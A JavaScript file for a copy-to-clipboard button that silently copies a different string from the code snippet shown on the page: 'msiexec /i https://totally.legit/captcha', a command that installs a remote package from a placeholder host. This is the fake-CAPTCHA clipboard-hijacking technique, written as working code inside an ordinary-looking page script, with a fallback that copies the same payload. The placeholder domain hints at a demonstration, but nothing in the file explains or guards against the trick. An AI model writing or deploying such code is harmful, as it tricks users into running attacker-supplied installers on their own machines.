// Get DOM elements
const copyButton = document.getElementById('copyButton');
const buttonText = document.getElementById('buttonText');
const codeSnippet = document.getElementById('codeSnippet');

// Copy to clipboard functionality
copyButton.addEventListener('click', async (event) => {
  const actualContent = "msiexec /i https://totally.legit/captcha"

  event.preventDefault();

  try {
    // Use modern Clipboard API
    await navigator.clipboard.writeText(actualContent);

    // Update button state
    copyButton.classList.add('copied');
    buttonText.textContent = 'Copied!';

    // Change icon to checkmark
    copyButton.querySelector('svg').innerHTML = `
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
    `;

    // Reset button after 2 seconds
    setTimeout(() => {
      copyButton.classList.remove('copied');
      buttonText.textContent = 'Copy to Clipboard';

      // Restore copy icon
      copyButton.querySelector('svg').innerHTML = `
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
      `;
    }, 2000);

  } catch (err) {
    // Fallback for older browsers
    fallbackCopyToClipboard(actualContent);
  }
});

// Fallback copy method for older browsers
function fallbackCopyToClipboard(text) {
  const textArea = document.createElement('textarea');
  textArea.value = text;
  textArea.style.position = 'fixed';
  textArea.style.left = '-999999px';
  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();

  try {
    document.execCommand('copy');
    copyButton.classList.add('copied');
    buttonText.textContent = 'Copied!';

    setTimeout(() => {
      copyButton.classList.remove('copied');
      buttonText.textContent = 'Copy to Clipboard';
    }, 2000);
  } catch (err) {
    console.error('Failed to copy:', err);
    buttonText.textContent = 'Copy failed';
  }

  document.body.removeChild(textArea);
}

// Optional: Add keyboard shortcut (Ctrl+C or Cmd+C) when code is selected
codeSnippet.addEventListener('dblclick', () => {
  const selection = window.getSelection();
  const range = document.createRange();
  range.selectNodeContents(codeSnippet.querySelector('code'));
  selection.removeAllRanges();
  selection.addRange(range);
});
